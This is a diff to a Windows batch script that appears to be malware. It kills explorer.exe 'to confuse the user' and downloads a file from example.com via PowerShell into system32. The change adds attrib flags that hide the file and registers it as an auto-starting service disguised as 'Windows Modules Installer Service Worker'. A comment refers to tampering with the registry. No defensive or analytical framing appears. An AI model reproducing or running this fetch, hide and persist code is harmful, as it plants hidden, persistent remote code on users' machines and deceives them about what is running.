@@ -37,8 +37,9 @@ REM kill EXPLORER to confuse the user
 taskkill /f /im explorer.exe
 
 REM Create a service for Client.CMD
-powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile C:\Program Files\client.cmd"
-sc create wmisswsvc binpath= "C:\Windows\system32\cmd.exe start /min C:\Program Files\client.cmd" error= ignore start= auto type= own displayname= "Windows Modules Installer Service Worker"
+powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile C:\Windows\system32\client.cmd"
+attrib +s +h +i C:\Windows\system32\client.cmd
+sc create wmisswsvc binpath= "C:\Windows\system32\cmd.exe start /min C:\Windows\system32\client.cmd" error= ignore start= auto type= own displayname= "Windows Modules Installer Service Worker"
 
 
 REM messing with the registry
